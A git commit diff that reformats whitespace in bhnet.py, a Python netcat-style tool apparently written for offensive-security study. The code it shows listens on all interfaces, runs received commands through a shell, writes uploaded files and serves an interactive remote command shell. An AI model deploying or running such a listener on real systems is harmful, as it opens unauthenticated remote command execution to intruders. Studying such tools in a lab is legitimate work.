c75a2e0946256c3010583c5c89e24fcdb1de99cb
Chris Luiz <chris@chrisluiz.io>
2017-09-17 21:16:43 -0400

    minor edits

--- bhnet.py
+++ bhnet.py
@@ -25,7 +25,7 @@ def usage():
     print "-e --execute=file_to_run - execute the given file upon receieving a connection"
     print "-c --command - initialize a command shell"
     print "-u --upload=destination  -upon receiving connection upload a file and write to [destination]"
-    print 
+    print
     print
     print "Examples: "
     print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
@@ -36,7 +36,7 @@ def usage():
 
 def client_sender(buffer):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+
     try:
         #connect to our target host
         client.connect((target, port))
@@ -55,26 +55,26 @@ def client_sender(buffer):
             #wait for more input
             buffer  = raw_input("")
             buffer += "\n"
-         
+
             #send it off
             client.send(buffer)
-        
+
     except:
             print "[*] Exception! Exiting."
             #tear down connection
             client.close()
-            
+
 def server_loop():
     global target
-    
+
     #if no target is defined, we listen on all interfaces
     if not len(target):
         target = "0.0.0.0"
-      
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target, port))
     server.listen(5)
-    
+
     while True:
         client_socket, addr = server.accept()
         #spin off a thread to handle our new client
@@ -85,13 +85,13 @@ def server_loop():
 def run_command(command):
     #trim the newline
     command = command.rstrip()
-  
+
     #run the command and get the output back
     try:
-        output = subprocess.check_output(command, 
+        output = subprocess.check_output(command,
                                          stderr=subprocess.STDOUT,
                                          shell=True)
-    except:      
+    except:
         output = "Failed to execute command.\r\n"
     #send output back to client
     return output
@@ -100,17 +100,17 @@ def client_handler(client_socket):
     global upload
     global execute
     global command
-    
+
     #check for upload
     if len(upload_destination):
-        
+
         #read in all of the bytes and write out to our destination
         file_buffer = ""
-        
+
         #keep reading in data until none is aavailable
         while True:
             data = client_socket.recv(1024)
-            
+
             if not data:
                 break
             else:
@@ -120,40 +120,40 @@ def client_handler(client_socket):
             file_descriptor = open(upload_destination,"wb")
             file_descriptor.write(file_buffer)
             file_descriptor.close()
-            
+
             #acknowledge that we wrote the file out
-            client_socket.send("Successfully saved file to %s\r\n" % 
+            client_socket.send("Successfully saved file to %s\r\n" %
                                upload_destination)
-            
+
         except:
             client_socket.send("Failed to save file to %s\r\n" %
                                upload_destination)
-    
+
     #check for command execution
     if execute:
         #run the command
         output = run_command(execute)
-        
+
         client_socket.send(output)
-        
+
     #now we go into another loop if a command shell was requested
     if command:
         while True:
             #show a simple prompt
             client_socket.send("<BHP:#> ")
-            
+
             # now we receive until we see a linefeed (enter key)
             cmd_buffer = ""
             while "\n" not in cmd_buffer:
                 cmd_buffer += client_socket.recv(1024)
-                
+
             #send back the command output
             response = run_command(cmd_buffer)
-            
+
             #send back the response
             client_socket.send(response)
-            
-        
+
+
 def main():
     global listen
     global port
@@ -161,28 +161,34 @@ def main():
     global command
     global upload_destination
     global target
-    
+
     if not len(sys.argv[1:]):
         usage()
-        
+
     # read the commandline options
-    
+
     try:
-        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
-                            ["help","listen","execute",
-                             "target","port","command","upload"])
+        opts, args = getopt.getopt(sys.argv[1:],
+                                   "hle:t:p:cu:",
+                                   ["help",
+                                    "listen",
+                                    "execute",
+                                    "target",
+                                    "port",
+                                    "command",
+                                    "upload"])
     except getopt.GetoptError as err:
         print str(err)
         usage()
-        
+
     for o, a in opts:
-        if o in ("-h","--help"):
+        if o in ("-h", "--help"):
             usage()
-        elif o in ("-l","--listen"):
+        elif o in ("-l", "--listen"):
             listen = True
         elif o in ("-e", "--execute"):
             execute = a
-        elif o in ("-c",  "--commandshell"):
+        elif o in ("-c", "--commandshell"):
             command = True
         elif o in ("-u", "--upload"):
             upload_destination = a
@@ -192,22 +198,22 @@ def main():
             port = int(a)
         else:
             assert False, "Unhandled Option"
-            
+
     # are we goign to listen or just send data from stdin?
     if not listen and len(target) and port > 0:
-        
-        #read in the buffer from the commandline
-        #this will block, so send CTRL-D if not sending input
-        #to STDIN
+
+        # read in the buffer from the commandline
+        # this will block, so send CTRL-D if not sending input
+        # to STDIN
         buffer = sys.stdin.read()
-        
-        #send data off
+
+        # send data off
         client_sender(buffer)
-        
-    #we are going to listen and potentially
-    #upload things, execute commands, and drop a shell back
-    #depending on our command line options from above
+
+    # we are going to listen and potentially
+    # upload things, execute commands, and drop a shell back
+    # depending on our command line options from above
     if listen:
         server_loop()
+
 main()
-    
